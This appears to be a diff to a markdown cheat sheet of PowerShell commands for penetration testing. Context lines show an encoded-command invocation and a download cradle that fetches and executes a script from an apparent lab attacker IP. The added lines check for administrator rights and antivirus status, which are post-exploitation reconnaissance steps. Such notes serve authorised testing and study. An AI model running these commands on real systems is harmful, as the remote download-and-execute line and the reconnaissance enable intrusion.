@@ -65,3 +65,16 @@ powershell.exe -e <base64 here>
 ```powershell
 IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.2:80/script.ps1')
 ```
+
+### Check if you are Administrator
+
+```powershell
+([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
+True
+```
+
+### Check antivirus
+
+```powershell
+Get-MpComputerStatus | Select-Object AntivirusEnabled
+```
